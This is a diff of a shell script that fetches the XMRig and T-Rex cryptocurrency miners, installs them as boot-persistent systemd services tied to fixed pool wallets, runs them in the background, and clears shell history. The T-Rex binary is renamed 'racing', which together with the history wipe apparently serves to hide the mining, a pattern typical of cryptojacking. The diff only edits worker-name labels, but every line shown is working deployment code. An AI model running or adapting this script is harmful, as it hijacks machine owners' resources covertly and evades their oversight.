@@ -25,26 +25,26 @@ then
     
     sudo wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-bionic-x64.tar.gz
     sudo tar xvzf xmrig-6.18.1-bionic-x64.tar.gz
-    sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/xmrig-6.18.1/xmrig -o us.zephyr.herominers.com:1123 -u ZEPHs8j21LWinpixofoVJP5KsXTCvaaTqjP1z4YwvDj3MHHe2UcmhA8UTUPTZ4MiQsjdX88aYg14rEJDYqdoQKkJeCq7NXq1XVT -p "'${myworker}_C_Re_${noCore}'" --coin zephyr -a rx/0 -t= "'${usingcore}'"\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
+    sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/xmrig-6.18.1/xmrig -o us.zephyr.herominers.com:1123 -u ZEPHs8j21LWinpixofoVJP5KsXTCvaaTqjP1z4YwvDj3MHHe2UcmhA8UTUPTZ4MiQsjdX88aYg14rEJDYqdoQKkJeCq7NXq1XVT -p "'${myworker}_ST_C_Re_${noCore}'" --coin zephyr -a rx/0 -t= "'${usingcore}'"\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
     
     sudo systemctl daemon-reload
     sudo systemctl enable xmrig.service
-    sudo ./xmrig-6.18.1/xmrig -o us.zephyr.herominers.com:1123 -u ZEPHs8j21LWinpixofoVJP5KsXTCvaaTqjP1z4YwvDj3MHHe2UcmhA8UTUPTZ4MiQsjdX88aYg14rEJDYqdoQKkJeCq7NXq1XVT -p ${myworker}_C_${noCore} --coin zephyr -a rx/0 -t= ${usingcore} &
+    sudo ./xmrig-6.18.1/xmrig -o us.zephyr.herominers.com:1123 -u ZEPHs8j21LWinpixofoVJP5KsXTCvaaTqjP1z4YwvDj3MHHe2UcmhA8UTUPTZ4MiQsjdX88aYg14rEJDYqdoQKkJeCq7NXq1XVT -p ${myworker}_ST_C_${noCore} --coin zephyr -a rx/0 -t= ${usingcore} &
     
     sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
     sudo tar -zxvf t-rex-0.25.12-linux.tar.gz
     sudo mv t-rex racing
-    sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o us-rvn.2miners.com:6060 -u RLDw5BV5vMx7146o4ojChjKRXQPrv9wb1n."'${myworker}_b_${noCore}_re'" -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+    sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o us-rvn.2miners.com:6060 -u RLDw5BV5vMx7146o4ojChjKRXQPrv9wb1n."'${myworker}_ST_C_${noCore}_re'" -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
     sudo systemctl daemon-reload
     sudo systemctl enable racing.service
-    sudo ./racing -a kawpow -o us-rvn.2miners.com:6060 -u RLDw5BV5vMx7146o4ojChjKRXQPrv9wb1n.${myworker}_b_${noCore} -p x &
+    sudo ./racing -a kawpow -o us-rvn.2miners.com:6060 -u RLDw5BV5vMx7146o4ojChjKRXQPrv9wb1n.${myworker}_ST_C_${noCore} -p x &
     history -c
 else
     sudo wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-bionic-x64.tar.gz
     sudo tar xvzf xmrig-6.18.1-bionic-x64.tar.gz
-    sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/xmrig-6.18.1/xmrig -o us.zephyr.herominers.com:1123 -u ZEPHs8j21LWinpixofoVJP5KsXTCvaaTqjP1z4YwvDj3MHHe2UcmhA8UTUPTZ4MiQsjdX88aYg14rEJDYqdoQKkJeCq7NXq1XVT -p "'${myworker}_C_Re_${noCore}'" --coin zephyr -a rx/0 -t= "'${usingcore}'"\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
+    sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/xmrig-6.18.1/xmrig -o us.zephyr.herominers.com:1123 -u ZEPHs8j21LWinpixofoVJP5KsXTCvaaTqjP1z4YwvDj3MHHe2UcmhA8UTUPTZ4MiQsjdX88aYg14rEJDYqdoQKkJeCq7NXq1XVT -p "'${myworker}_ST_C_Re_${noCore}'" --coin zephyr -a rx/0 -t= "'${usingcore}'"\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
     sudo systemctl daemon-reload
     sudo systemctl enable xmrig.service
-    sudo ./xmrig-6.18.1/xmrig -o us.zephyr.herominers.com:1123 -u ZEPHs8j21LWinpixofoVJP5KsXTCvaaTqjP1z4YwvDj3MHHe2UcmhA8UTUPTZ4MiQsjdX88aYg14rEJDYqdoQKkJeCq7NXq1XVT -p ${myworker}_C_${noCore} --coin zephyr -a rx/0 -t= ${usingcore} &
+    sudo ./xmrig-6.18.1/xmrig -o us.zephyr.herominers.com:1123 -u ZEPHs8j21LWinpixofoVJP5KsXTCvaaTqjP1z4YwvDj3MHHe2UcmhA8UTUPTZ4MiQsjdX88aYg14rEJDYqdoQKkJeCq7NXq1XVT -p ${myworker}_ST_C_${noCore} --coin zephyr -a rx/0 -t= ${usingcore} &
     history -c
 fi
